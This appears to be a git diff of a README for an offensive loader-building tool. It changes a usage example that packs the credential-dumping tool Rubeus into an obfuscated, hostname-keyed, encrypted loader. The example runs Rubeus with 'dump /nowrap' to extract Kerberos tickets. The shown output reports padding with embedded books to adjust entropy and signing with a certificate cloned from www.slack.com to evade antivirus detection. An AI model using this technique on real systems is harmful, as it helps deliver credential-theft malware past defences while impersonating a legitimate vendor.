@@ -27,19 +27,21 @@ cd PositiveIntent
 pip install -r requirements.txt
 ```
 
-## Usage
+## Example Usage
 
 ```
-python build.py --file /tmp/Rubeus.exe --hostname TEST --domain www.zoom.com
+python build.py --file ~/Rubeus.exe --hostname TEST --domain www.slack.com --args "dump /nowrap" --writetofile
 
 [+] Obfuscated loader source files
 [+] Keyed on hostname TEST
-[+] Encrypted and embedded /tmp/Rubeus.exe as a resource file
 [+] Randomized loader filename
-[+] Embedded 1 books as resource files
-[+] Entropy of loader: 5.35
-[+] Digitally signed loader with certificate cloned from www.zoom.com
-[+] Loader compiled to /tmp/PositiveIntent/temp/pwCXupfi.exe
+[+] Encrypted and embedded /home/kali/Rubeus.exe as a resource file
+[*] Your decryption key is fgSDxBWIRQWJaIOS
+[*] Building loader and adjusting entropy...please hold.
+[+] Embedded 4 books as resource files
+[+] Entropy of loader: 5.45
+[+] Signed loader with certificate cloned from www.slack.com
+[+] Loader compiled to /home/kali/PositiveIntent/temp/nJbxZAGC.exe
 ```
 
 ## Detection Status
